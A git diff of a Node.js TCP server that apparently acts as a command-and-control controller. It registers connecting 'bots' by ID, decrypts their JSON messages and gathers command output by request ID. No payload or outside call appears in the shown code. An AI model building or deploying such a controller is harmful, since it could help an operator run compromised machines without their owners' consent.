@@ -1,7 +1,7 @@
 import { createServer } from 'net';
 import { unencryptCMD } from './encryption.js';
 import {api} from "./api.js"
-import {bots} from "./db.js"
+import { bots, socket_map, requests } from "./db.js"
 import {config} from 'dotenv'
 config()
 
@@ -10,22 +10,30 @@ const socket_port = process.env.SOCKET_PORT || 9000
 
 const socketServer = createServer((socket) => {
 
-    socket.on('data', (data) => {
-        const newBotInfo = JSON.parse(unencryptCMD(data.toString()));
-        newBotInfo['status'] = "Connected"
-        bots[socket] = newBotInfo;
-        console.log('Client connected: ' + newBotInfo);
+    socket.on('data', (rawData) => {
+        const decrypedData = unencryptCMD(rawData.toString()).trim();
+        const data = JSON.parse(decrypedData);
+        if (data['Type'] == "Connection") {
+            data['Status'] = "Connected"
+            data['Socket'] = socket;
+            bots[data['ID']] = data;
+            socket_map[socket] = data['ID'];
+            console.log('Client connected: ' + data);
+        } else if (data['Type'] == "Output") {
+            requests[data["RequestID"]].push(data)
+            console.log(requests)
+        }
     });
 
 
     socket.on('end', () => {
         console.log('Client disconnected');
-        bots[socket]['status'] = "Disconnected"
+        bots[socket_map[socket]]['status'] = "Disconnected"
     });
 
     socket.on('error', (err) => {
         console.error('Socket error:', err);
-        bots[socket]['status'] = "Disconnected"
+        bots[socket_map[socket]]['status'] = "Disconnected"
     });
 });
 
